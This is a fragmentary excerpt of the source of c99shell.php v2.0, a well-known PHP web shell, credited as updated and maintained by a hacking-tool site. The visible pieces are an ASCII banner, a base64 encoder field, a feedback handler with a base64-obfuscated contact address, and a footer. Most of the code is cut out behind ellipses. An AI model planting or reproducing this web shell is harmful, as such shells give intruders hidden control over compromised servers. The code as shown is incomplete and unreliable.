...
|_.__/ \__, | \_| \_/\__,_|_/___\___|_| |_\_____/\___/ \__,_|_|\___|
        __/ |                                                       
       |___/                                                        
*			c99shell.php v.2.0 (PHP 7) (25.02.2019) Updated by: HackingTool for PHP 7
*			https://www.hackingtool.net
******************************************************************************************************
*/
...
";
 ...
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"" . base64_encode($encoder_input) . "\" readonly></center>";
    ...
    if ($act == "feedback")
    {
        $suppmail = base64_decode("YWRtaW5AZ29vZ2xlLmNvbQ==");
        if (!empty($submit))
        {
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99shell v. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>maintained by</b></u></a> HackingTool | <a href="https://www.hackingtool.net"><font color="#FF0000">HackingTool</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime() - starttime, 4); ?> ]--</b></p></td></tr></table>
